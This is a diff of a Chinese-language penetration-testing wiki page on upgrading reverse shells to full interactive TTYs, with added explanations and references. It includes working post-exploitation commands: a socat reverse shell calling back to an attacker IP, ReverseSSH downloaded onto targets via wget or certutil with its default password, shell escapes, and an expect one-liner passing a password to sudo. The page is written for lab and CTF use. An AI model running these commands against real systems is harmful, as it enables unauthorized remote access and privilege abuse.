@@ -1,26 +1,31 @@
 # 完整 TTY
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ## 完整 TTY
 
-请注意，你在 `SHELL` 变量中设置的 shell **必须**被**列在** _**/etc/shells**_ 中，否则会显示 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`。另外，请注意，下面的代码片段仅适用于 bash。如果你使用的是 zsh，请在获取 shell 前运行 `bash` 切换到 bash。
+`/etc/shells` 列出有效的 login-shell 路径名，部分程序会查询该文件；它并不是分配 PTY 的通用前提。<sup>[[3]](#references)[[4]](#references)</sup> 如果某个程序（例如 `pkexec`）因 `The value for the SHELL variable was not found in the /etc/shells file` 拒绝 `SHELL`，请确保 `/etc/shells` 中存在完全匹配的 shell 路径（例如 `/bin/bash`）。<sup>[[10]](#references)</sup> 下面的 `CTRL+Z`/`fg` 恢复序列使用 Bash job control；如果当前 shell 不是 Bash，请先启动 Bash，再使用该序列。<sup>[[7]](#references)</sup>
 
 #### Python
+
+Python 的 `pty.spawn` 会启动一个与当前进程的标准输入、输出和错误流相连的程序，从而为本次会话中的 Bash 提供 pseudo-terminal。<sup>[[4]](#references)</sup>
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 > [!TIP]
-> 执行 **`stty -a`** 可以获取 **行** 和 **列** 的**数量**
+> 你可以通过运行 **`stty -a`** 获取 **行数** 和 **列数**；`-a` 会打印所有当前终端设置。该命令的输出因终端而异，因此请使用当前会话报告的值。<sup>[[11]](#references)</sup>
 
 #### script
+
+`script` 工具会记录终端会话；这里 `/dev/null` 会丢弃 typescript，`-q` 会抑制启动和完成消息，`-c` 会运行 Bash，而不是默认 shell。<sup>[[5]](#references)</sup>
 ```bash
 script /dev/null -qc /bin/bash #/dev/null is to not store anything
+```
+在任一种 PTY-spawn 方法之后，挂起 Netcat 会话并以本地 raw mode 恢复，然后设置远程终端的环境和尺寸：
+```bash
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 #### socat
+
+监听器将当前终端置于 raw 模式并禁用本地回显，同时接受端口 4444 上的 TCP 连接。victim 命令分配一个 pty，合并 stderr，创建会话，转发 SIGINT，并应用 sane 终端设置；如果子进程需要 controlling terminal，请添加 `ctty`。<sup>[[6]](#references)</sup>
 ```bash
 #Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
@@ -41,36 +46,37 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 - IRB: `exec "/bin/sh"`
 - vi: `:!bash`
 - vi: `:set shell=/bin/bash:shell`
-- nmap: `!sh`
+- nmap（旧版本，带有 `--interactive`）：`!sh`
+
+Nmap escape 与版本有关：Nmap 在后续版本中移除了 `--interactive` 模式，因此 `!sh` 仅适用于旧版本。<sup>[[13]](#references)</sup>
 
 ## ReverseSSH
 
-一种便捷的**交互式 shell 访问**方式，同时还支持**文件传输**和**端口转发**，就是将静态链接的 ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) 放置到目标上。<sup>[[1]](#references)</sup>
+将静态链接的 ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) 部署到目标上，是获得**交互式 shell 访问**以及进行**文件传输**和**端口转发**的一种便捷方式。<sup>[[1]](#references)</sup>
 
-下面是一个使用 upx 压缩二进制文件的 `x86` 示例。对于其他二进制文件，请查看 [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/)。
+下面是使用该项目发布的 UPX 压缩二进制文件针对 `x86` 的示例。对于其他架构或 release artifacts，请使用 [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) 进行导航。<sup>[[1]](#references)</sup>
 
-1. 在本地准备好，以接收 ssh 端口转发请求：
+1. 准备本地主机以接收传入的 SSH 连接。在 listener mode 中，`-l` 启用 listener，`-p 4444` 选择接受目标连接的端口。<sup>[[1]](#references)</sup>
 ```bash
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
 
 /dev/shm/reverse-ssh -v -l -p 4444
 ```
-- (2a) Linux target:
+- (2a) Linux target。将相同的 `upx_reverse-sshx86` artifact 传输到 `/dev/shm/reverse-ssh`，并使其可执行。目标上的 `-p 4444` 选择上方的 listener 端口，而 `kali@10.0.0.2` 提供用于回连的账户和主机。<sup>[[1]](#references)</sup>
 ```bash
-# Drop it via your preferred way, e.g.
-wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
-
 /dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
 ```
-- (2b) Windows 10 目标（对于更早版本，请查看 [project readme](https://github.com/Fahrj/reverse-ssh#features)）：
+- (2b) Windows target。完整交互式 PowerShell 需要 Windows 10 build 17763；请参阅 [project README](https://github.com/Fahrj/reverse-ssh#features)。<sup>[[1]](#references)</sup>
 ```bash
 # Drop it via your preferred way, e.g.
 certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe
 
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
-- 如果 ReverseSSH 端口转发请求成功，现在你应该可以使用默认密码 `letmeinbrudipls`，以运行 `reverse-ssh(.exe)` 的用户身份登录：
+Windows 示例使用 `certutil` 配合 `-f -urlcache`；Microsoft 将 `-f` 说明为强制获取 URL，并指出可用参数因版本而异，因此如果此形式不可用，请检查 `certutil -?`。<sup>[[12]](#references)</sup>
+
+- 反向连接成功后，ReverseSSH 的 reverse-mode listener 默认绑定端口 `8888`（或使用 `-b` 提供的值），传入连接可接受任意用户名，默认密码为 `letmeinbrudipls`。远程 shell 将以启动 `reverse-ssh(.exe)` 的账户权限运行。<sup>[[1]](#references)</sup>
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -80,13 +86,13 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-[Penelope](https://github.com/brightio/penelope) 会自动将 Linux reverse shells 升级为 TTY，处理终端大小，记录所有内容以及更多功能。此外，它还为 Windows shells 提供 readline 支持。<sup>[[2]](#references)</sup>
+[Penelope](https://github.com/brightio/penelope) 会自动将 Unix-like reverse shells 升级为 PTY、调整 Unix-like terminals 的大小，并记录 shell 交互；对于 Windows shells，它提供 readline，但不支持实时 terminal 调整大小。<sup>[[2]](#references)</sup>
 
-![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
+运行 `penelope` 默认会监听 `0.0.0.0:4444`；随后传入的 Unix-like shells 可以自动升级并记录。<sup>[[2]](#references)</sup>
 
-## 无 TTY
+## No TTY
 
-如果由于某种原因无法获得完整的 TTY，**仍然可以与需要用户输入的程序交互**。在下面的示例中，密码会传递给 `sudo`，用于读取文件：
+如果由于某种原因无法获得完整的 TTY，**仍然可以与需要用户输入的程序进行交互**。在以下示例中，Expect 启动 `sudo`，等待其密码提示符，发送密码，并通过 `interact` 返回控制权；`sudo -S` 会从标准输入读取密码。仅在经过授权的 lab 中使用，并避免将真实凭据放入 shell history 或源文件中。<sup>[[8]](#references)[[9]](#references)</sup>
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
@@ -94,5 +100,15 @@ expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PAS
 
 - [1] [ReverseSSH - 为 CTF 等场景提供 reverse shell 功能的静态链接 ssh server](https://github.com/Fahrj/reverse-ssh)
 - [2] [Penelope - 自动执行一些操作以简化使用的 Shell handler](https://github.com/brightio/penelope)
-
+- [3] [shells(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/shells.5.html)
+- [4] [Python `pty` — Python 文档](https://docs.python.org/3/library/pty.html)
+- [5] [script(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/script.1.html)
+- [6] [socat(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/socat.1.html)
+- [7] [Bash Reference Manual — Job Control](https://www.gnu.org/s/bash/manual/bash.html)
+- [8] [sudo(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/sudo.8.html)
+- [9] [expect(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/expect.1.html)
+- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
+- [11] [stty(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/stty.1.html)
+- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
+- [13] [Nmap Change Log](https://nmap.org/changelog.html)
 {{#include ../../banners/hacktricks-training.md}}
